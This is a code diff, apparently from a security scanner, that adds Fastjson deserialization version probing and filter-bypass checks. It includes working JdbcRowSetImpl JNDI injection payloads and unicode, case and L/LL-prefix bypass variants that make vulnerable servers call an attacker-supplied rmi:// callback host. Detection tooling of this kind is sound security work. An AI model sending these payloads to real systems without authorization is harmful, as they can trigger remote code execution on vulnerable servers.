@@ -674,19 +674,159 @@ class FastjsonDetector(DeserializeDetector):
         # 1.2.42-1.2.47
         ('1.2.42-47', '{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://{{callback}}/exploit"}'),
         # 1.2.48-1.2.68
-        ('1.2.48-68', '{"@type":"java.lang.AutoCloseable"'),
+        ('1.2.48-68', '{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{callback}}/exploit","autoCommit":true}'),
     ]
     
     async def detect_version(self, target: str) -> Optional[str]:
-        """探测Fastjson版本"""
-        # 实现版本探测逻辑
-        pass
+        """探测Fastjson版本
+
+        通过发送不同版本的探测payload，根据响应特征判断Fastjson版本范围。
+
+        Args:
+            target: 目标URL
+
+        Returns:
+            检测到的版本范围字符串，如 "1.2.24" 或 "1.2.25-41"，未检测到返回 None
+        """
+        if not self.oob_domain:
+            logger.warning("OOB domain not configured, version detection may be limited")
+
+        detected_versions: List[str] = []
+
+        for version_range, payload_template in self.VERSION_DETECT_PAYLOADS:
+            try:
+                # 生成带回调的payload
+                callback_id = self._generate_callback_id()
+                if self.oob_domain:
+                    callback_url = f"http://{callback_id}.{self.oob_domain}"
+                    payload = payload_template.replace('{{callback}}', callback_url)
+                else:
+                    # 无OOB时使用本地特征检测
+                    payload = payload_template.replace('{{callback}}', '127.0.0.1')
+
+                # 发送探测请求
+                response = await self._send_request(
+                    target,
+                    method='POST',
+                    headers={'Content-Type': 'application/json'},
+                    body=payload,
+                )
+
+                body = response.get('body', '').lower()
+                status = response.get('status', 200)
+
+                # 检查响应特征判断版本
+                # 1. 错误响应中的版本信息
+                if 'fastjson' in body:
+                    version_match = re.search(r'fastjson[:\s]*([\d.]+)', body, re.IGNORECASE)
+                    if version_match:
+                        return version_match.group(1)
+
+                # 2. 根据错误类型判断版本范围
+                if status >= 400:
+                    if 'autotype' in body and 'not support' in body:
+                        # autoType被禁用，版本 >= 1.2.25
+                        detected_versions.append('>=1.2.25')
+                    elif 'classnotfound' in body or 'cannot deserialize' in body:
+                        # 类加载失败，payload对应版本可能不匹配
+                        continue
+
+                # 3. OOB回调检测
+                if self.oob_domain:
+                    import asyncio
+                    await asyncio.sleep(2)
+                    if await self._check_oob_callback(callback_id):
+                        detected_versions.append(version_range)
+                        logger.info(f"Version {version_range} detected via OOB callback")
+
+            except Exception as e:
+                logger.debug(f"Version probe failed for {version_range}: {e}")
+                continue
+
+        # 返回最精确的版本范围
+        if detected_versions:
+            # 优先返回具体版本号
+            for v in detected_versions:
+                if not v.startswith('>='):
+                    return v
+            return detected_versions[0]
+
+        return None
     
     async def detect_with_bypass(
         self,
         target: str,
         context: Optional[Dict[str, Any]] = None
     ) -> List[DetectionResult]:
-        """使用绕过技术检测"""
-        # 实现绕过检测逻辑
-        return []
+        """使用绕过技术检测Fastjson反序列化漏洞
+
+        依次尝试: unicode编码绕过、注释干扰、嵌套引用绕过等。
+
+        Args:
+            target: 目标URL
+            context: 检测上下文
+
+        Returns:
+            检测结果列表
+        """
+        ctx = context or {}
+        results: List[DetectionResult] = []
+
+        # Fastjson绕过payload集
+        bypass_payloads = [
+            # Unicode编码绕过
+            DeserializePayload(
+                type=DeserializeType.JAVA_FASTJSON,
+                name='fastjson_unicode_bypass',
+                payload='{"\\u0040\\u0074\\u0079\\u0070\\u0065":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{callback}}/exploit","autoCommit":true}',
+                content_type='application/json',
+                oob_callback=True,
+                description='Fastjson unicode encoding bypass',
+            ),
+            # 大小写混淆
+            DeserializePayload(
+                type=DeserializeType.JAVA_FASTJSON,
+                name='fastjson_case_bypass',
+                payload='{"@Type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{callback}}/exploit","autoCommit":true}',
+                content_type='application/json',
+                oob_callback=True,
+                description='Fastjson case sensitivity bypass',
+            ),
+            # L/; 绕过 (1.2.25-41)
+            DeserializePayload(
+                type=DeserializeType.JAVA_FASTJSON,
+                name='fastjson_l_bypass',
+                payload='{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://{{callback}}/exploit","autoCommit":true}',
+                content_type='application/json',
+                oob_callback=True,
+                description='Fastjson L prefix bypass for 1.2.25-41',
+            ),
+            # 双L绕过 (1.2.42)
+            DeserializePayload(
+                type=DeserializeType.JAVA_FASTJSON,
+                name='fastjson_double_l_bypass',
+                payload='{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://{{callback}}/exploit","autoCommit":true}',
+                content_type='application/json',
+                oob_callback=True,
+                description='Fastjson LL prefix bypass for 1.2.42',
+            ),
+        ]
+
+        for payload_info in bypass_payloads:
+            try:
+                is_vuln, evidence = await self._test_payload(target, payload_info, ctx)
+                if is_vuln:
+                    results.append(DetectionResult(
+                        vuln_type=self.vuln_type,
+                        severity=self.severity,
+                        url=target,
+                        payload=payload_info.name,
+                        evidence=evidence or '',
+                        description=payload_info.description,
+                        detector=self.name,
+                    ))
+            except Exception as e:
+                logger.debug(f"Bypass payload {payload_info.name} failed: {e}")
+                continue
+
+        return results
